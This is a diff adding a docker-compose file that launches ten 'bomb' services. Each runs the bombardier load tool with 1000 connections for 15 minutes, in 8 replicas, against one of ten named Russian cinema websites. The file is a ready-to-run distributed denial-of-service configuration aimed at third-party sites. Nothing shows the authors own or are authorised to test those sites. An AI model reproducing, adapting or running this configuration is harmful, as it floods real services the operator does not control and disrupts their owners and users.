@@ -1,0 +1,54 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://mos-kino.ru/
+    deploy:
+      replicas: 8
+  bomb02:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://cinemastar.ru/
+    deploy:
+      replicas: 8
+  bomb03:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://kinoteatr.ru/
+    deploy:
+      replicas: 8
+  bomb04:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://karofilm.ru/
+    deploy:
+      replicas: 8
+  bomb05:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://kinosfera-imax.ru/
+    deploy:
+      replicas: 8
+  bomb06:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://kinomax.ru/
+    deploy:
+      replicas: 8
+  bomb07:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://romanov-cinema.ru/
+    deploy:
+      replicas: 8
+  bomb08:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://pioner-cinema.ru/
+    deploy:
+      replicas: 8
+  bomb09:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://premierzal.ru/
+    deploy:
+      replicas: 8
+  bomb10:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://www.mirage.ru/
+    deploy:
+      replicas: 8
